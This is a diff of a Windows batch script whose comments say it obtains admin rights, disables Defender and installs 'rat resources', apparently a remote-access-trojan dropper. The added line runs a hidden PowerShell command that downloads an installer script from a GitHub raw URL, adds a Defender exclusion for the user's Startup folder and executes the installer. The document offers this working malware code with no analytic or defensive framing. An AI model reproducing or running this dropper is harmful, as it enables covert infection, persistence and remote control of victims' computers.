@@ -1,5 +1,7 @@
 REM get admin permissions for script
 @echo off
+
+
 :: BatchGotAdmin
 :-------------------------------------
 REM  --> check for permissions
@@ -32,8 +34,8 @@ REM you can remove the 'powershell' to get an admin CMD
 REM disable defender
 
 REM rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Kuper-xx/Perseus/refs/heads/main/files/installer.ps1' -Outfile 'installer.ps1'"
-powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
+
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Kuper-xx/Perseus/refs/heads/main/files/installer.ps1' -Outfile 'installer.ps1'"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup" ; ./installer.ps1
 
 
 REM 
